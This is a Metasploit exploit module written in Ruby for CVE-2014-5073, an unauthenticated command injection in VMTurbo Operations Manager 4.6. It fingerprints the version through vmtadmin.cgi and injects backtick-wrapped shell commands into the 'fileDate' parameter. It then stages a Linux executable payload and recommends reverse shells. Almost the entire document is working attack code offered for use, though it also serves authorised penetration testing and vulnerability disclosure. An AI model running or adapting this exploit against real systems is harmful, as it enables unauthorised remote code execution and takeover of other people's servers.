##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'VMTurbo Operations Manager 4.6 vmtadmin.cgi 
Remote Command Execution',
      'Description' => %q{
          VMTurbo Operations Manager 4.6 and prior are vulnerable to 
unauthenticated
          OS Command injection in the web interface. Use reverse 
payloads for the most
          reliable results. Since it is a blind OS command injection 
vulnerability,
          there is no output for the executed command when using the cmd 
generic payload.
          Port binding payloads are disregarded due to the restrictive 
firewall settings.

          This module has been tested successfully on VMTurbo Operations 
Manager versions 4.5 and
          4.6.
      },
      'Author'      =>
        [
          # Secunia Research - Discovery and Metasploit module
          'Emilio Pinna <emilio.pinn[at]gmail.com>'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
            ['CVE', '2014-5073'],
            ['OSVDB', '109572'],
            ['URL', 'http://secunia.com/secunia_research/2014-8/']
        ],
      'DisclosureDate' => 'Jun 25 2014',
      'Privileged'     => false,
      'Platform'       => %w{ linux unix },
      'Payload'        =>
        {
          'Compat'   =>
          {
            'ConnectionType' => '-bind'
          }
        },
      'Targets'        =>
      [
        [ 'Unix CMD',
          {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
          }
        ],
        [ 'VMTurbo Operations Manager',
          {
          'Arch' => [ ARCH_X86, ARCH_X86_64 ],
          'Platform' => 'linux'
          }
        ],
      ],
      'DefaultTarget'  => 1
      ))

    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')
  end

  def check
  begin
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => "/cgi-bin/vmtadmin.cgi",
      'vars_get' => {
        "callType" => "ACTION",
        "actionType" => "VERSIONS"
      }
    })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, 
::Rex::ConnectionTimeout
      vprint_error("#{peer} - Failed to connect to the web server")
      return Exploit::CheckCode::Unknown
  end

  if res and res.code == 200 and res.body =~ 
/vmtbuild:([\d]+),vmtrelease:([\d.]+),vmtbits:[\d]+,osbits:[\d]+/
    version = $2
    build = $1

    vprint_status("#{peer} - VMTurbo Operations Manager version 
#{version} build #{build} detected")
    else
      vprint_status("#{peer} - Unexpected vmtadmin.cgi response")
      return Exploit::CheckCode::Unknown
    end

    if version and version <= "4.6" and build < "28657"
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def execute_command(cmd, opts)
    begin
    res = send_request_cgi({
      'uri'    => '/cgi-bin/vmtadmin.cgi',
      'method' => 'GET',
      'vars_get' => {
        "callType" => "DOWN",
        "actionType" => "CFGBACKUP",
        "fileDate" => "\"`#{cmd}`\""
      }
    })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, 
::Rex::ConnectionTimeout
      vprint_error("#{peer} - Failed to connect to the web server")
      return nil
    end

    vprint_status("Sent command #{cmd}")
  end

  #
  # generate_payload_exe doesn't respect module's platform unless it's 
Windows, or the user
  # manually sets one. This method is a temp work-around.
  #
  def check_generate_payload_exe
    if generate_payload_exe.nil?
      fail_with(Failure::BadConfig, "#{peer} - Failed to generate the 
ELF. Please manually set a payload.")
    end
  end

  def exploit

    # Handle single command shot
    if target.name =~ /CMD/
      cmd = payload.encoded
      res = execute_command(cmd, {})

      unless res
        fail_with(Failure::Unknown, "#{peer} - Unable to execute 
payload")
      end

      print_status("#{peer} - Blind Exploitation - unknown exploitation 
state")
      return
    end

    check_generate_payload_exe

    # Handle payload upload using CmdStager mixin
    execute_cmdstager({:flavor => :printf})
  end
end

